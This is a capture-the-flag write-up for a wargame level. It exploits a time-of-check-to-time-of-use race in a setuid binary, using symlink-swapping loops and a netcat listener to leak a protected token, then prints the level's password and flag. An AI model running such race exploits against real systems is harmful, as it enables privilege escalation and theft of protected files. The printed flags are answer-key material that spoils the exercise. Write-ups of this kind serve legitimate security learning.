## writeup level10

When we logged in as user level10, we see two files: one token file, and one binary with suid bit.
```shell
$ ls -l token level10
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token

$ ./level10
./level10 file host
	sends file to host if you have access to it
```
We learn this binary sends a file to host. With some gdb debugging, we learn it uses first `access` to check if the file is accessible, \
it then uses `socket` to create a connection on the port **6969**, it then opens the file, and write the content to the socket. \
With `netcat` we can create a little tcp server that listens on that port:
```shell
$ nc -l 6969 &
```
We then try to send the token file to host `0.0.0.0`:
```shell
$ ./level10 $PWD/token 0.0.0.0
You don't have access to /home/user/level10/token
```
Hum well, we cannot use this file because of permissions... But after some search, we found [on wikipedia](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use), that we can do a race condition to bypass the `access` function.
So we did and:
```shell
$ # we create a file so it has our permissions
$ touch /tmp/toto

$ # then we create a loop that we put in the background 
$ # that symlinks /tmp/token to /tmp/toto first and then to the token file
$ while true; do
	ln -sf /tmp/toto /tmp/token;
	ln -sf /home/user/level10/token /tmp/token;
done &

$ # then we put another loop in the background and we run the executable
$ while true; do
	if ./level10 /tmp/token 0.0.0.0 &>/dev/null; then break; fi
done &

$ # then we run a loop that every 0.1s will run the netcat server and sometime print the flag
$ while sleep 0.1; do
  nc -l 6969
done
...
woupa2yuojeeaaed06riuj63c
...
^C

$ su flag10
woupa2yuojeeaaed06riuj63c

$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
